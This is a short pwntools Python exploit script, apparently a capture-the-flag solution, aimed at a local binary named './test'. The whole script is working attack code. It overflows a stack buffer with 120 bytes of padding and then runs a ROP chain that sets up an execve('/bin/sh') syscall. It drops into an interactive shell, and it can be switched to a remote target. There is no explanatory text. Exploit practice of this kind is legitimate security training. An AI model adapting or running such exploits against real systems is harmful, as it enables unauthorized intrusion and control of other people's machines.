from pwn import*

filename = "./test"
elf = ELF(filename)
libc = elf.libc 
local = 1
if local:
    r = process(filename)
else:
    node = ''
    num = 0
    r = remote(node,num)
#gdb.debug(filename,'b * 0x0401269')
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'sp', '-h']

bin_sh =  0x402008
pop_rax = 0x40118C  
syscall = 0x040117E  
pop_rdi = 0x0040118e
payload = b'A'*120   + p64(pop_rdi)  + p64(bin_sh) + p64(pop_rax) + p64(59) + p64(syscall)
r.sendlineafter("?",payload)

r.interactive()



